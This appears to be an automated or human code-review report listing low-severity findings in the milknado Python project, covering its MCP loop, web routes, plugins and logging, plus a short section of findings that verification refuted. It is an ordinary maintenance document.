- [low] src/milknado/mcp/loop.py:24 — mcp.loop imports TmuxAdapter only as a 'monkeypatch seam' that production code never uses, and re-exports private app.loop helpers only for tests.
- [low] src/milknado/mcp/_core.py:163 — Only tests use the module-level aliases `_parse_kind`, `_parse_todo_status`, and `_parse_flavor`. All src callers use the public names.
- [low] src/milknado/mcp/_core.py:116 — build_run_dict keeps only RunDict keys, so it silently drops the `terminal_persistence: "degraded"` marker that poll_async_run sets for runs whose terminal write failed.
- [low] src/milknado/mcp/_loop_node_runner.py:186 — open_graph and the two set_pid writes run before the try block. A SQLite error there escapes main without a terminal run row, without a `.terminal-error` sidecar, and without graph.close().
- [low] src/milknado/mcp/loop.py:66 — The `timeout_seconds` parameter of milknado_run_loop_start does not bound the loop: the runner never receives it, and it is used only as the stale-sweep threshold for pid-less runs.
- [low] src/milknado/mcp/todo_mutate.py:224 — In milknado_edit_node, the `only_files` existence check is redundant, because update_node_fields already raises when the node is absent. The function is also about 65 lines, which is more than the 40-line project limit.
- [low] src/milknado/mcp/github.py:23 — github._roots is a copy of wiki._wiki_root_for, and milknado_github_roadmap_import computes a wiki root that it then discards.
- [low] src/milknado/mcp/node.py:17 — The module docstring puts the done-transition completion gate in `mcp.todo_mutate`, but the gate is in domains/graph/_verification.py.
- [low] src/milknado/mcp/follow_up.py:82 — The follow-up tool copies a dict with a key-by-key comprehension. The worker-identity parser it depends on is in the read-tools module todo.py, not next to its only caller.
- [low] src/milknado/web/login.py:18 — LaunchToken.verify passes untrusted str input to hmac.compare_digest, which raises TypeError on non-ASCII strings instead of returning False.
- [low] src/milknado/web/routes/node_edits.py:33 — When graph_edits is None, the node-edit and review routes raise an uncaught RuntimeError (500), while the sibling note/retry/skip routes return 409.
- [low] src/milknado/web/routes/node_edits.py:58 — The routes use assert for type narrowing and catch AssertionError as a 409 business error.
- [low] src/milknado/web/routes/reviews.py:23 — The goal-review decision takes the decided_by identity from the request body without validation, so the audit record can name any actor.
- [low] src/milknado/web/server.py:75 — server.py declares a stale mid-file __all__ that omits the functions the package exports, and wait_for_shutdown ends its loop with a no-op continue.
- [low] src/milknado/web/hosts.py:77 — _cancel_owner has a branch that production cannot reach, and the OwnerController Protocol misdescribes the real controller.
- [low] src/milknado/web/commands.py:120 — _owner_capabilities has a run_id parameter that no caller passes.
- [low] src/milknado/web/fanout.py:194 — _terminate is a pass-through wrapper around _schedule_termination.
- [low] src/milknado/web/server.py:66 — run_server opens the browser before uvicorn binds the port, and in owner mode that launch counts against the 1-second readiness timeout.
- [low] src/milknado/plugins/scaffold.py:13 — PLUGIN_TEMPLATE imports `PluginHook` but never uses it, so every scaffolded plugin starts with a lint failure.
- [low] src/milknado/plugins/loader.py:49 — discover_entry_point_plugins casts the loaded entry-point object to type[PluginHook] without the `_is_plugin` check that load_plugins uses, and neither path removes a plugin that both the config and an entry point supply.
- [low] src/milknado/adapters/_protection.py:15 — An adapter imports the root composition module milknado.project, which also wires the graph and the plugin loader, only to read config.
- [low] src/milknado/process_logging.py:19 — The milknado log format string is duplicated between the stderr handler and the run-loop file handler.
- [low] tests/test_run_loop_logging.py:146 — configure_stderr_logging idempotency is tested twice in two files, and the copy sits in the run-loop logging module, which has no relation to it.
- [low] src/milknado/domains/github/_intent.py:14 — The github slice imports wiki internals (domains.wiki.model), although the wiki barrel already exports the same symbol.

## Refuted

Verification rejected these findings. The reason is in parentheses.

- tests/batching/test_graph_build.py:48 — CRG tests use a MagicMock with invented edge shapes and relative paths, so they cannot detect the path-form or edge-direction bugs. (citation: Cited path tests/batching/test_graph_build.py is a test file, not production source.)
- tests/test_plugin_scaffold.py:34 — The scaffold tests assert template substrings instead of behavior, so they pass on a broken kebab-case scaffold and they enshrine an unused import in the generated code. (citation: Evidence appears at lines 34-43, but the cited path tests/test_plugin_scaffold.py is a test file, not production source.)
